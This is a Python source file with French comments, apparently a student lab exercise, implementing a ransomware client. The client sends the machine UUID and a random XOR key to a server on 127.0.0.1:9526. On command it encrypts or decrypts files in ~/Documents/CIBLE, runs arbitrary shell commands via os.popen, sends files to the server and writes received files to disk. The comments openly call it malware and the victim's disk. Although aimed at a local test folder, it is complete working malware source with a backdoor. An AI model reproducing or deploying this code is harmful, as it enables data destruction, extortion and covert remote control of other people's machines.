import os      # Pour manipuler les fichiers et le système
import socket  # Pour la communication réseau avec le serveur 
import random  # Pour générer des éléments aléatoires
import string  # Pour manipuler les chaînes de caractères (lettres A-Z)

# IP du serveur 
IP_SERVEUR = "127.0.0.1" 
# Port écouter par le serveur
PORT_SERVEUR = 9526

def obtenir_uuid_machine():
    # Ouvre le fichier système qui contient un UUID généré par Linux
    with open("/proc/sys/kernel/random/uuid", "r") as f:
        # Lit le contenu et enlève les espaces ou retours à la ligne avec .strip()
        return f.read().strip()

def generer_cle_chiffrement():
    # string.ascii_uppercase contient toutes les lettres de A à Z en majuscule
    lettres = string.ascii_uppercase
    # random.choice choisit une lettre au hasard 16 fois, puis .join les rassemble
    return ''.join(random.choice(lettres) for i in range(16))

def appliquer_xor(chemin_du_fichier, cle_texte):
    # Lecture en mode Binaire ("rb") pour accepter images, PDF, etc.
    with open(chemin_du_fichier, "rb") as f:
        donnees = f.read()
    
    # Transforme la clé texte en liste d'octets
    cle_octets = cle_texte.encode()
    # bytearray() crée une liste d'octets modifiable pour stocker le résultat
    resultat = bytearray()
    
    # On parcourt chaque octet (nombre entre 0 et 255) du fichier
    for i in range(len(donnees)):
        # L'opérateur ^ fait le calcul XOR entre l'octet du fichier et celui de la clé
        # le % (modulo) permet de recommencer la clé au début si le fichier est plus long
        resultat.append(donnees[i] ^ cle_octets[i % len(cle_octets)])
    
    # Réécriture en binaire ("wb") pour remplacer le contenu original
    with open(chemin_du_fichier, "wb") as f:
        f.write(resultat)

def gerer_fichiers(cle, nom_action):
    """ Parcourt récursivement le dossier cible pour chiffrer ou déchiffrer """
    # Lieu du dossier cible de l'attaque (~/Documents/CIBLE)
    # (j'ai fais ça pour ne pas corrompre toute ma VM)
    dossier_cible = os.path.expanduser("~/Documents/CIBLE") 
    
    # Créer le dossier s'il n'existe pas
    if not os.path.exists(dossier_cible):
        os.makedirs(dossier_cible)

    # os.listdir() liste le contenu. Si la liste est vide [], c'est "True" avec 'not'
    if not os.listdir(dossier_cible):
        # Créer un fichier à chiffrer s'il y en a pas dans le dossier cible
        fichier_temoin = os.path.join(dossier_cible, "coucou.txt")
        with open(fichier_temoin, "w") as f:
            f.write("coucou le boss. Celui que se fait merveilleusement avoir pour le test. :)")
        
    nb_fichiers_impacte = 0
    # os.walk parcourt tout le dossier, ses sous-dossiers et ses fichiers
    for racine, dossiers, fichiers in os.walk(dossier_cible):
        for nom_f in fichiers:
            # Sécurité : on ignore les fichiers .py pour ne pas chiffrer le malware
            if nom_f.endswith(".py"):
                continue
            
            # Reconstitue le chemin complet vers le fichier (ex: /home/user/CIBLE/test.txt)
            chemin_complet = os.path.join(racine, nom_f)
            try:
                # Applique le calcul XOR sur le fichier
                appliquer_xor(chemin_complet, cle)
                nb_fichiers_impacte += 1
            except:
                # En cas d'erreur (droit refusé), on passe simplement au fichier suivant
                pass
                
    return f"{nom_action} effectue sur {nb_fichiers_impacte} fichiers."

def demarrer_client():
    # Étape 1 : Récupération de l'UUID de la machine
    UUID_MACHINE = obtenir_uuid_machine()
    # Étape 2 : Génération de la clé de chiffrement (16 lettres A-Z)
    CLE_SESSION = generer_cle_chiffrement()

    # Création du socket client pour se connecter au serveur 
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        try:
            # Tente d'établir la connexion TCP avec le serveur
            client_socket.connect((IP_SERVEUR, PORT_SERVEUR))
        except:
            # Si le serveur n'est pas lancé, le programme s'arrête discrètement
            return

        # Étape 3 : Exfiltration immédiate de l'ID et de la CLÉ vers le serveur
        message = f"UUID:{UUID_MACHINE} | CLE:{CLE_SESSION}"
        client_socket.sendall(message.encode())

        # Étape 4 : Le client attend les ordres du serveur dans une boucle
        while True:
            # Reçoit l'ordre envoyé par le serveur
            ordre = client_socket.recv(1024).decode()

            if ordre == "chiffrer":
                # Lance le chiffrement XOR sur les fichiers du dossier cible
                reponse = gerer_fichiers(CLE_SESSION, "Chiffrement")
                client_socket.sendall(reponse.encode())

            elif ordre == "dechiffrer":
                # Relance le même calcul XOR (ce qui déchiffre) sur les fichiers
                reponse = gerer_fichiers(CLE_SESSION, "Dechiffrement")
                client_socket.sendall(reponse.encode())

            elif ordre == "system":
                # Attend le deuxième message contenant la commande shell
                cmd_a_faire = client_socket.recv(1024).decode()
                # os.popen() exécute la commande système Linux et .read() récupère le texte produit
                sortie_console = os.popen(cmd_a_faire).read()
                # Renvoie le résultat de la commande au serveur (ou un message de succès vide)
                client_socket.sendall(sortie_console.encode() if sortie_console else b"Succes")

            elif ordre == "download":
                # Reçoit le nom du fichier que le serveur veut récupérer
                nom_f = client_socket.recv(1024).decode()
                # Vérifie si le fichier existe
                if os.path.exists(nom_f):
                    with open(nom_f, "rb") as f:
                        donnees = f.read()
                        # Envoie la taille des données sur 16 caractères
                        client_socket.sendall(str(len(donnees)).encode().ljust(16))
                        # Envoie le contenu du fichier
                        client_socket.sendall(donnees)
                else:
                    # Envoie un message d'erreur si fichier absent
                    client_socket.sendall(b"ERREUR".ljust(16))

            elif ordre == "upload":
                # Reçoit le nom du futur fichier
                nom_f = client_socket.recv(1024).decode()
                # Reçoit la taille annoncée
                taille_data = client_socket.recv(16).decode().strip()
                # Reçoit les octets du fichier
                donnees_recues = client_socket.recv(int(taille_data))
                # Sauvegarde le fichier sur le disque de la victime
                with open(nom_f, "wb") as f:
                    f.write(donnees_recues)
                client_socket.sendall(b"Fichier bien recu par le client.")

            elif ordre == "quitter":
                # Arrête la boucle et ferme la connexion
                break

            else:
                # Bloc de sécurité : s'exécute si 'ordre' ne correspond à aucun ordre
                # On envoie une réponse en octets (préfixe b) pour éviter que le serveur ne reste bloqué
                # Cela maintient la synchronisation entre le client et le serveur
                client_socket.sendall(b"Commande inconnue")
demarrer_client()